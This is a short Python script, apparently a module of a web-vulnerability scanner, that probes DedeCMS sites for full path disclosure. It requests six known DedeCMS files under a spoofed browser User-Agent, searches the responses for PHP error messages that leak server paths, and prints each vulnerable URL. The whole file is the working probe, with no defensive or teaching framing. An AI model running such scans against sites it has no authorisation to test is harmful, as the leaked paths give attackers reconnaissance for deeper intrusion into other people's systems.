import requests
from termcolor import cprint
import re

class path:

    def __init__(self,url):

        self.url = url

    def checkpath(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        payloads = [
            'member/inc/config_pay_yeepay.php',
            'member/inc/config_pay_tenpay.php',
            'member/inc/config_pay_nps.php ',
            'member/inc/config_pay_cbpayment.php ',
            'member/inc/config_pay_alipay.php',
            'include/downmix.inc.php'
        ]
        try:

            for payload in payloads:
                vulnurl = url + payload
                r = requests.get(url=vulnurl,headers=headers)
                if r.status_code == 200:
                    m = re.search('in <b>([^<]+)</b>', r.text)
                    if m:
                        cprint("dedecmd path:" + vulnurl,"red")

        except:
            return False
